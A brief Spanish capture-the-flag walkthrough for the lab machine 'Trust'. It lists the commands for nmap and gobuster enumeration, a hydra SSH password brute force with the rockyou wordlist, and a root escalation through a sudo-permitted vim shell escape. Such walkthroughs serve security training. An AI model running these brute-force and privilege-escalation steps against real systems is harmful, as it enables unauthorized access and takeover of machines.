Maquina: Trust
Autor: El Pinguino de Mario 
Dificultad: Muy Facil

ping 172.17.0.2 -c 1

sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oN puertos

sudo gobuster dir -w /usr/share/wordlist/Seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u 'http://172.17.0.2/' -x .php,.sh,.py,.txt

buscamos en el archivo encontrado y descubrimos el nombre de un usuario
utilizamos hydra para conseguir la contraseña
hydra -l mario -P /usr/share/wordlists/rockyou.txt.gz ssh://172.17.0.2

entramos por ssh con la contraseña encontrada
ssh mario@172.17.0.2

sudo -l
descubrimos que podemos ejecutar el comando vim
sudo -u root /usr/bin/vim
:!/bin/bash
whoami
